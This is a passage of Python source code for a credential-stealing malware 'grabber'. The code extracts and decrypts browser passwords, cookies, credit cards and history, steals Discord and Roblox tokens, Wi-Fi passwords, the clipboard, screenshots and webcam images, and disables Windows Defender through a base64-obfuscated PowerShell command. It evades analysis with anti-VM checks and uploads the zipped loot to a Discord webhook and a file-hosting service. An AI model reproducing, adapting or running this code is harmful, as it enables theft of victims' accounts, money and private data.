            return ""
        try:
            if len(credit_cards_data) > 0:
                credit_cards_str = ""
                for card in credit_cards_data:
                    hostname = card[0]
                    username = card[1]
                    password = card[2]
                    entry_str = "Hostname: {:<40} Username: {:<20} Password: {}\n".format(hostname, username, password)
                    credit_cards_str += entry_str
                if not os.path.exists(os.path.join(self.dir, "Firefox")):
                    os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
                with open(os.path.join(self.dir, "Firefox", f"Credits Cards.txt"), "w", encoding="utf-8") as output_file:
                    output_file.write(credit_cards_str)
                self.thingstocount[f'creditcard'] += len(username)
        except:
            pass


    def fetch_firefox_data(self, profile_path):
        data_db_path = os.path.join(profile_path, "cookies.sqlite")
        try:
            conn = sqlite3.connect(data_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host, isSecure, path, isHttpOnly, expiry, name, value FROM moz_cookies")
            data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return ""

        data_str = ""
        for item in data:
            host = item[0]
            is_secure = "TRUE" if item[1] else "FALSE"
            path = item[2]
            is_http_only = "TRUE" if item[3] else "FALSE"
            expiration = str(item[4])
            name = item[5]
            value = item[6]
            item_str = f"{host}\t{is_secure}\t{path}\t{is_http_only}\t{expiration}\t{name}\t{value}"
            data_str += item_str + "\n"
        
        try:
            if not os.path.exists(os.path.join(self.dir, "Firefox")):
                os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
            with open(os.path.join(self.dir, "Firefox", f"{justaterm}.txt"), "w", encoding="utf-8") as output_file:
                output_file.write(data_str)
            
            self.thingstocount[f'{justatermlil}'] += len(host)
        except Exception as e:
            pass

    def decrypt_passwords(self, export):
        def output_line(line, file):
            file.write(line)

        got_password = False
        credentials = self.obtain_credentials(self.profile)
        to_export = {}
        if not os.path.exists(os.path.join(self.dir, "Firefox")):
            os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
        with open(os.path.join(self.dir, "Firefox", f"Passwords.txt"), "w", encoding="utf-8") as output_file:
            for url, user, passw, enctype in credentials:
                got_password = True
                if enctype:
                    user, passw = self.decode_entry(user, passw)
                if export:
                    address = urlparse(url)
                    if address.netloc not in to_export:
                        to_export[address.netloc] = {user: passw}
                    else:
                        to_export[address.netloc][user] = passw
                else:
                    output = (
                        u"\nWebsite: {0}\n".format(url),
                        u"ID: {0}\n".format(user),
                        u"Password: {0}\n".format(passw),
                    )
                    for line in output:
                        output_line(line, output_file)
        credentials.done()
        if not got_password:
            pass
        if export:
            return to_export
        
    def fetch_firefox_history(self, profile_path):
        history_db_path = os.path.join(profile_path, "places.sqlite")
        try:
            conn = sqlite3.connect(history_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM moz_places")
            history_data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return ""

        history_str = ""
        for entry in history_data:
            url = entry[0]
            title = entry[1]
            visit_count = entry[2]
            entry_str = f"Visit Count: {visit_count} Title: {title} Link: {url}\n"
            history_str += entry_str
            
            
        if not os.path.exists(os.path.join(self.dir, "Firefox")):
            os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
        with open(os.path.join(self.dir, "Firefox", "History.txt"), "w", encoding="utf-8") as file:
            file.write(history_str)
        self.thingstocount['historybaby'] += len(url)
    
    def is_firefox_installed(self):
        program_files_path = os.environ.get("PROGRAMFILES")
        firefox_path = os.path.join(program_files_path, "Mozilla Firefox", "firefox.exe")
        return os.path.exists(firefox_path)


    def firefox(self):
        args = self.parse_sys_args()
        if not self.is_firefox_installed():
            return
        self.test_firefox_psw(args["export_pass"])
        basepath = os.path.expanduser(args['profile'])
        profiles = self.get_profile(basepath, args['interactive'], args['choice'], args['list'])
        for profile in profiles:
            try:
                self.fetch_firefox_history(profile)
                self.fetch_firefox_data(profile)
                self.load_profile(profile)
                self.fetch_firefox_credit_cards(profile)
                self.fetch_firefox_bookmarks(profile)
                self.authenticate(args['interactive'])
                to_export = self.decrypt_passwords(
                    export=args['export_pass'],
                )
                if args['export_pass']:
                    self.export_pass(to_export, args['pass_prefix'])
                        
                self.unload_profile()
                self.firefox_installed = True
            except Exception as e:
                pass



    @extract_try
    def hwkishsteal_psw2(self, name: str, path: str, profile: str):
        if self.hwk_get_browsers != "yes":
            return

        path = os.path.join(path, profile, "Login Data")
        if not os.path.isfile(path):
            return

        loginvault = self.dir_random_create()
        try:
            shutil.copy2(path, loginvault)
            conn = sqlite3.connect(loginvault)
            cursor = conn.cursor()
            with open(os.path.join(self.dir, "Browsers", "Passwords.txt"), "a", encoding="utf-8") as f:
                for url, username, password in cursor.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if url:
                        password = self.value_decrypt(password, self.masterkey)
                        f.write(
                            f"Website: {url}\nID: {username}\nPassword: {password}\n\n")
                        self.thingstocount['passwrd'] += len(password)
            cursor.close()
        finally:
            conn.close()
            os.remove(loginvault)


    @extract_try
    def gang_hwkstl(self, file_name: str, file_path: str, proc_file: str):
        if self.hwk_get_browsers != "yes":
            return
        cckcs = self.dir_random_create()
        shutil.copy2(os.path.join(file_path, proc_file, ntwrk, f"{justaterm}"), cckcs)
        with sqlite3.connect(cckcs) as conn:
            cursor = conn.cursor()
            query = "SELECT {columns} FROM {table}".format(columns="host_key, name, path, encrypted_value, expires_utc", table=f"{justatermlil}")
            for res in cursor.execute(query).fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.value_decrypt(encrypted_value, self.masterkey)
                if host_key and name and value:
                    with open(os.path.join(self.dir, "Browsers", f"{justaterm}.txt"), "a", encoding="utf-8") as f:
                        f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        os.remove(cckcs)
        self.thingstocount[f'{justatermlil}'] += len(host_key)

    @extract_try
    def hwkishsteal_psw(self):
        if self.hwk_get_browsers != "yes":
            return

        with open(os.path.join(self.dir, "Google", "Passwords.txt"), "w", encoding="cp437", errors="ignore") as f:
            for prof in os.listdir(self.chrome_user_path):
                if re.match(self.chrmrgx, prof):
                    login_db = os.path.join(
                        self.chrome_user_path, prof, "Login Data")
                    login = self.files_creating()
                    shutil.copy2(login_db, login)

                    with sqlite3.connect(login) as conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT origin_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url, username, encrypted_password = r
                            decrypted_password = self.value_decrypt(
                                encrypted_password, self.chrome_key)
                            if url:
                                f.write(
                                    f"Website: {url}\nID: {username}\nPassword: {decrypted_password}\n\n")
                                self.thingstocount['passwrd'] += len(
                                    decrypted_password)
                    os.remove(login)
    
    @extract_try
    def hwkishstol_gang(self):
        if self.hwk_get_browsers != "yes":
            return
        with open(os.path.join(self.dir, "Google", f"{justaterm}.txt"), "w", encoding="cp437", errors="ignore") as f:
            for prof in os.listdir(self.chrome_user_path):
                if re.match(self.chrmrgx, prof):
                    login_db = os.path.join(self.chrome_user_path, prof, ntwrk, f"{justatermlil}")
                    login = self.files_creating()
                    shutil.copy2(login_db, login)
                    conn = sqlite3.connect(login)
                    cursor = conn.cursor()
                    cursor.execute(f"SELECT host_key, name, encrypted_value from {justatermlil}")

                    for r in cursor.fetchall():
                        host, user, encrypted_value = r
                        dcryptedcks = self.value_decrypt(encrypted_value, self.chrome_key)
                        if host != "":
                            f.write(f"{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{dcryptedcks}\n")
                        if "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in dcryptedcks:
                            self.rblxcckcs.append(dcryptedcks)
                        self.thingstocount[f'{justatermlil}'] += len(dcryptedcks)
                        self.thingstocount['roblox_friendly'] += len(self.rblxcckcs)
                    cursor.close()
                    conn.close()
                    os.remove(login)
            f.close()

    def hwkishsteal_thisbookmarks(self, name: str, path: str, profile: str):
        if self.hwk_get_browsers != "yes":
            return
        path = os.path.join(path, profile, "Bookmarks")
        if not os.path.isfile(path):
            return
        with open(path, "r", encoding="utf-8") as f:
            bookmarks_data = json.load(f)
        bookmarks = []
        if "roots" in bookmarks_data:
            for folder_key, folder_data in bookmarks_data["roots"].items():
                if "children" in folder_data:
                    for bookmark in folder_data["children"]:
                        if "type" in bookmark and bookmark["type"] == "url" and "url" in bookmark and "name" in bookmark:
                            visit_count = 0
                            last_visit_time = 0
                            if "visit_count" in bookmark:
                                visit_count = bookmark["visit_count"]
                            if "date_last_visited" in bookmark:
                                last_visit_time = bookmark["date_last_visited"]
                            bookmarks.append((bookmark["url"], bookmark["name"], visit_count, last_visit_time))
                            
        bookmarks.sort(key=lambda x: x[3], reverse=True)
        self.thingstocount["bookmarksbaby"] += len(bookmarks)
        with open(os.path.join(self.dir, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8") as f:
            for bookmark in bookmarks:
                f.write("Title: {:<6} URL: {:<40}\n".format(bookmark[1], bookmark[0]))
        


    def hwkishsteal_thishist2(self, name: str, path: str, profile: str):
        if self.hwk_get_browsers != "yes":
            return
        path = os.path.join(path, profile, "History")
        if not os.path.isfile(path):
            return
        historyvault = self.dir_random_create()
        shutil.copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(
            os.path.join(self.dir, "Browsers", "History.txt"), "a", encoding="utf-8", ) as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls WHERE url IS NOT NULL AND title IS NOT NULL AND visit_count IS NOT NULL AND last_visit_time IS NOT NULL").fetchall():
                sites.append(res)
            sites.sort(key=lambda x: x[3], reverse=True)
            self.thingstocount['historybaby'] += len(sites)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                    site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def hwkishsteal_cc2(self, name: str, path: str, profile: str):
        if self.hwk_get_browsers != "yes":
            return
        path += "\\" + profile + "\\Web Data"
        if not os.path.isfile(path):
            return
        cc_vaults = self.dir_random_create()
        shutil.copy2(path, cc_vaults)
        with sqlite3.connect(cc_vaults) as conn:
            conn.row_factory = sqlite3.Row
            with conn.cursor() as cursor:
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards WHERE name_on_card != '' AND card_number_encrypted != ''")
                with open(os.path.join(self.dir, "Browsers", "CC.txt"), "a", encoding="utf-8") as f:
                    for res in cursor.fetchall():
                        name_on_cc, expir_on_cc, expir_year_cc, number_onmy_cc = res
                        f.write(f"Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n")
                        self.thingstocount['creditcard'] += len(name_on_cc)
        os.remove(cc_vaults)

    @extract_try
    def hwkishsteal_thishist(self):
        if self.hwk_get_browsers != "yes":
            return

        with open(os.path.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
            def hwkishpleaseexctract(db_cursor):
                db_cursor.execute("SELECT title, url, last_visit_time FROM urls")
                for item in db_cursor.fetchall():
                    yield f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.time_convertion(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"

            def exctract_websearch_bc(db_cursor):
                db_cursor.execute("SELECT term FROM keyword_search_terms")
                for item in db_cursor.fetchall():
                    if item[0] != "":
                        yield item[0]

            for prof in os.listdir(self.chrome_user_path):
                if not re.match(self.chrmrgx, prof):
                    continue
                login_db = os.path.join(self.chrome_user_path, prof, "History")
                login = self.files_creating()
                shutil.copy2(login_db, login)
                with sqlite3.connect(login) as conn:
                    cursor = conn.cursor()
                    search_history = exctract_websearch_bc(cursor)
                    web_history = hwkishpleaseexctract(cursor)
                    f.write(f"{' ' * 17}{hwkish}-{stspecial} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}")
                    self.thingstocount['historybaby'] += sum(
                        1 for _ in search_history)
                    self.thingstocount['historybaby'] += sum(1 for _ in web_history)
                    cursor.close()
                    os.remove(login)

    def natify_matched_tokens(self):
        with open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors="ignore") as f:
            try:
                for token in self.hawked:
                    headers = self.header_making(token)
                    j = httpx.get(self.disc_url_api, headers=headers).json()
                    user = f"{j['username']}#{j['discriminator']}"
                    flags = j.get("flags", 0)
                    badge_flags = {
                    1: "Staff",
                    2: "Partner",
                    4: "Hypesquad Event",
                    8: "Green Bughunter",
                    64: "Hypesquad Bravery",
                    128: "Hypesquad Brilliance",
                    256: "Hypesquad Balance",
                    512: "Early Supporter",
                    16384: "Gold BugHunter",
                    131072: "Verified Bot Developer",
                    4194304: "Active Developer",
                    }
                    badges = [badge_flags[f] for f in badge_flags if flags & f]
                    if not badges:
                        badges = ["None"]
                    email = j.get("email", "No Email attached")
                    phone = j.get("phone", "No Phone Number attached")
                    try:
                        nitro_data = httpx.get(
                            self.disc_url_api + "/billing/subscriptions", headers=headers
                              ).json()
                        has_nitro = bool(nitro_data)
                    except:
                       pass
                    time.sleep(3)
                    try:
                        payment_sources = json.loads(
                            httpx.get(
                            self.disc_url_api + "/billing/payment-sources", headers=headers
                            ).text
                            )
                    except:
                        pass
                    billing = bool(payment_sources)
                    f.write(
                        f"{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
                    )
                    self.thingstocount['info_discord'] += 1
            except:
                pass

    def found_thismc(self) -> None:
        if self.hwk_get_mc != "yes":
            return
        mcdir = os.path.join(self.roaming, ".minecraft")
        if not os.path.exists(mcdir) or not os.path.isfile(os.path.join(mcdir, "launcher_profiles.json")):
            return
        os.makedirs(pathtoget := os.path.join(
            self.dir, "Minecraft"), exist_ok=True)
        count = 0
        for i in os.listdir(mcdir):
            if i.endswith((".json", ".txt", ".dat")):
                shutil.copy2(os.path.join(mcdir, i), os.path.join(pathtoget, i))
                count += 1
        self.thingstocount["friendlybabymc"] += count

    def downloadclipboard(self):
        if self.hwk_get_clipboard != "yes":
            return
        output = Functions.hwkishfindClipboard()
        if output:
            with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write(
                    f"{hwkish}-{stspecial} | https://github.com/{hwkish}-{stspecial}/{hwkish}-{grbber}\n\n" + output)
                

    def hwkishfindUSBdevices(self):
        try:
            output = Functions.hwkishfindDevices()
            if output:
                with open(os.path.join(self.dir, 'Systeme', 'Devices Info.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(
                    f"{hwkish} | https://github.com/{hwkish}-{stspecial}/{hwkish}-{grbber}\n\n" + output)
        except Exception:
            return None
        

    def hwkishgetmyAV(self):
        if self.hwk_get_av != "yes":
            return
        cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName'
        with Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) as proc:
            output, error = proc.communicate()
            if proc.returncode != 0:
                print(f"Error: {error}")
                return
            output_lines = output.strip().split("\n")
            if len(output_lines) < 2:
                return
            av_list = output_lines[1:]
            av_path = os.path.join(self.dir, "Systeme", "Anti Virus.txt")
            with open(av_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write("\n".join(av_list))

    def hwkishdisabledefender(self):
        if self.disablemydefender != "yes":
            return

        try:
            cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK').decode()
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error disabling Windows Defender: {e}")
            pass

    @extract_try
    def hwkishget_mywifi(self):
        if self.hwk_get_wifipassword != "yes":
            return

        passwords = Functions.hwkishfindwifi()
        profiles = [
            f'SSID: {ssid}\n{hwkish}-{stspecial}  PASSW:{password}' for ssid, password in passwords.items()]
        divider = f'\n\n{hwkish}-{stspecial} | https://github.com/{hwkish}-{stspecial}/{hwkish}-{grbber}\n\n'

        with open(os.path.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
            file.write(divider + divider.join(profiles))

        self.thingstocount['wifinet'] += len(profiles)

    def find_roblox(self):
        if self.hwk_get_rblx != "yes":
            return

        def subproc(path):
            try:
                return (
                    subprocess.check_output(
                        rf"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                        creationflags=0x08000000,
                    )
                    .decode()
                    .rstrip()
                )
            except Exception:
                return None

        regex_c00ks = subproc(r"HKLM") or subproc(r"HKCU")
        if regex_c00ks:
            self.rblxcckcs.append(regex_c00ks)
        if self.rblxcckcs:
            with open(os.path.join(self.dir, "Roblox", f"Roblox_{justaterm}.txt"), "w") as f:
                f.write("\n".join(self.rblxcckcs))

    def upload_on_anonfiles(self, file_name, path):
        try:
            with open(path, mode="rb") as file:
                files = {"file": (file_name, file)}
                response = requests.post("https://api.anonfiles.com/upload", files=files)
                json_response = response.json()
                if json_response["status"]:
                    self.thezip_url = json_response["data"]["file"]["url"]["full"]
                    print("success :", self.thezip_url)
                    return True
                else:
                    print("Error :", json_response["error"]["message"])
                    return False
        except Exception as e:
            print("Error :", str(e))
            return False
    def camera_baby(self):
        try:
            camera = cv2.VideoCapture(0)
            result, image = camera.read()
            if result:
                cv2.imwrite(self.dir + f"\\Systeme\\Cam.png",image)
                self.thingstocount['screenshotbro'] += 1
            else:
                pass
        except:
            pass

    def screen_baby(self):
        if self.hwk_get_screen != "yes":
            return
        try:
           screen_width = win32api.GetSystemMetrics(0)
           screen_height = win32api.GetSystemMetrics(1)
           image = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))
           image.save(self.dir + f"\\Systeme\\Screenshot.png")
        except Exception as e:
            pass
        

    def system_informations(self):
        if self.hwk_get_sys != "yes":
            return
        about = [
            f"{imthebestdev} | {spoted_victim}",
            f"Windows Key: {self.windowfoundkey}",
            f"Windows Version: {self.never_wind}",
            f"Ram Storage: {self.fastmem_stored}GB",
            f"Disk Storage: {space_stored}GB",
            f"Hwid: {self.window_wid}",
            f"IP: {self.ip}",
            f"City: {self.city}",
            f"Country: {self.country}",
            f"Region: {self.region}",
            f"Org: {self.org}",
            f"GoogleMaps: {self.googlemap}",
            f"Lang: {self.pc_codewinl}"
        ]
        with open(os.path.join(self.dir, 'Systeme', 'System_Info.txt'), 'w', encoding='utf-8', errors='ignore') as f:
            f.write('\n'.join(about))

    def finished_bc(self):
        for i in os.listdir(self.dir):
            if i.endswith(".txt"):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                f"{hwkish}-{grbber} Create By {hwkish}-{stspecial} Team | https://github.com/{hwkish}-{stspecial}\n\n"
                            )
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x
                                + f"\n\n{hwkish}-{grbber} Create By {hwkish}-{stspecial} Team | https://github.com/{hwkish}-{stspecial}"
                            )
        _zipfile = os.path.join(
            self.appdata, f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_[{imthebestdev}].zip")
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        path_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(path_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        file_count, files_found, tokens = 0, "", ""
        for _, __, files in os.walk(self.dir):
            for _file in files:
                files_found += f"- {_file}\n"
                file_count += 1
        for tkn in self.hawked:
            tokens += f"{tkn}\n\n"
        fileCount = f"{file_count} {hwkish}-{grbber} FILES: "

        embed = {
            "username": f"{hwkish}-{grbber}",
            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
            "embeds": [
                {
                    "author": {
                        "name": f"{hwkish}-{grbber} v7",
                        "url": f"https://github.com/{hwkish}-{grbber}",
                        "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
                    },
                    "color": 16734976,
                    "description": f"[{hwkish}-{grbber} ON TOP]({self.googlemap})",
                    "fields": [
                        {
                            "name": "\u200b",
                            "value": f"""```ansi
[2;40m[2;47m[2;42m[2;41m[2;45mIP:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.ip if self.ip else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mOrg:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.org if self.org else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mCity:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.city if self.city else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mRegion:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.region if self.region else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mCountry:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.country if self.country else "N/A"}[0m[2;34m[0m
```
                            """.replace(
                                " ", " "
                            ),
                            "inline": False,
                        },
                        {
                            "name": "\u200b",
                            "value": f"""```markdown
                                # Computer Name: {spoted_victim.replace(" ", " ")}
                                # Windows Key: {self.windowfoundkey.replace(" ", " ")}
                                # Windows Ver: {self.never_wind.replace(" ", " ")}
                                # Ram Stockage: {self.fastmem_stored}GB
                                # Disk Stockage: {space_stored}GB
                                # Total Disk Storage: {self.total_gb:.2f}GB
                                # Used {self.used_gb:.2f}GB
                                # Free: {self.free_gb:.2f}GB
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": True,
                        },
                        {
                            "name": "\u200b",
                            "value": f"""```markdown
                                # {justaterm} Found: {self.thingstocount[f'{justatermlil}']}
                                # Passwords Found: {self.thingstocount['passwrd']}
                                # Credit Card Found: {self.thingstocount['creditcard']}
                                # Wifi Passwords Found: {self.thingstocount['wifinet']}
                                # Bookmarks Found: {self.thingstocount['bookmarksbaby']}
                                # History Found: {self.thingstocount['historybaby']}
                                # Minecraft Tokens Found: {self.thingstocount['friendlybabymc']}
                                # Discord Tokens Found: {self.thingstocount['info_discord']}
                                # Roblox {justaterm} Found: {self.thingstocount['roblox_friendly']}
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": True,
                        },
                        {
                            "name": fileCount,
                            "value": f"""```ansi
                            [2;37m[2;30m[2;34mDisk Used at:
                            [2;31m[0m[2;34m[2;31m{self.progress_bar} {self.used_percent:.2f}%[0m[2;34m[0m[2;30m[0m[2;37m[0m
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": False,
                        },
                        {
                            "name": fileCount,
                            "value": f"""```markdown
                                {files_found}
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": False,
                        },
                        {
                            "name": "**- Valid Tokens Found:**",
                            "value": f"""```yaml
{tokens[:2000] if tokens else "tokens not found"}```
    """.replace(" ", ""),
                            
                            "inline": False,
                        },

                    ],
                    "footer": {
                        "text": f"{hwkish}-{grbber} Create BY {hwkish}-{stspecial} Team・https://github.com/{hwkish}-{stspecial}"
                    },
                }
            ],
        }

        try:
            with open(_zipfile, "rb") as f:
                if self.webapi_find in self.thishawk_webh:
                    httpx.post(self.thishawk_webh, json=embed)
                    httpx.post(self.thishawk_webh,files={"upload_file": f}) 
                    time.sleep(5)
        except:
            pass

        try:
            self.upload_on_anonfiles(f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_{imthebestdev}.zip", _zipfile)
            time.sleep(10)
        except:
            pass
        finally:
            try:
                f.close()
                zipped_file.close()
                _zipfile.close()
            except:
                pass
            try:
                os.remove(_zipfile)
            except:
                pass

class AntiDebugg(Functions):
    inVM = False
    def __init__(self):
        def fetch_blocked_programs(url):
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                return data
            else:
                pass 
        
        self.processes = list()

        blocked_prog = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_progr.json"
        blocked_pcname = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blockedpcname.json"
        blocked_hwid = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_hwid.json"
        blocked_ips = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_ips.json"
        self.users_blocked = fetch_blocked_programs(blocked_prog)
        self.pcname_blocked = fetch_blocked_programs(blocked_pcname)
        self.hwid_blocked = fetch_blocked_programs(blocked_hwid)
        self.ips_blocked =fetch_blocked_programs(blocked_ips)

        for func in [self.last_check, self.keys_regex, self.Check_and_Spec]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def last_check(self):
        blocked_paths = [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]
        blocked_users = set(self.users_blocked)
        blocked_pcnames = set(self.pcname_blocked)
        blocked_ips = set(self.ips_blocked)
        blocked_hwids = set(self.hwid_blocked)

        if any(os.path.exists(path) for path in blocked_paths):
            self.programExit()
        if imthebestdev in blocked_users:
            self.programExit()
        if spoted_victim in blocked_pcnames:
            self.programExit()
        if self.info_netword()[0] in blocked_ips:
            self.programExit()
        if self.info_sys()[0] in blocked_hwids:
            self.programExit()

    def Check_and_Spec(self):
        memorystorage = int(fastmem_stored)
        storagespace = int(space_stored)
        cpu_count = psutil.cpu_count()
        if memorystorage <= 2 or storagespace <= 100 or cpu_count <= 1:
            self.programExit()

    def keys_regex(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if (reg1 and reg2) != 1:
            self.programExit()
        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":
    asyncio.run(hwkish_first_funct().init())
Threadlist = []


def find_in_config(e: str) -> str or bool | None:
    return json_confg.get(e)


hooks = f'{base64.b64decode(find_in_config("hooking_hawk"))}'.replace(
    "b'", "").replace("'", "")
hook = str(hooks)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]



def Requests_loading(methode, url, data="", files="", headers=""):
    for i in range(8):
        try:
            if methode == "POST":
                if data != "":
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != "":
                    r = requests.post(url, files=files)
                    if (
                            r.status_code == 200 or r.status_code == 413
                    ):  
                        return r
        except:
            pass


def URL_librairy_Loading(hook, data="", files="", headers=""):
    for i in range(8):
        try:
            if headers != "":
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass

def upload(name, tk=""):
    headers = {
        "Content-Type": "application/json",
